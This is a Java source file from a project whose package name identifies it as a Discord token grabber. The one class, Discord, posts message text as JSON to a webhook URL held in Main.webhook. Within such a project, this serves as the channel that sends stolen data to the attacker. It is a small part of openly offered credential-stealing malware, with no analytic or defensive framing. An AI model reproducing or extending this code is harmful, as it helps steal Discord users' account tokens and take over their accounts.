package com.github.dedinc.discordtokengrabber.utils;

import org.json.JSONObject;

import com.github.dedinc.discordtokengrabber.Main;

public class Discord {
  public void sendMessage(String message) {
	  Helper.getRequest().post(Main.webhook, new JSONObject(String.format("{\"content\": \"%s\"}", message.replace("\n", "\\n"))));
  }
}
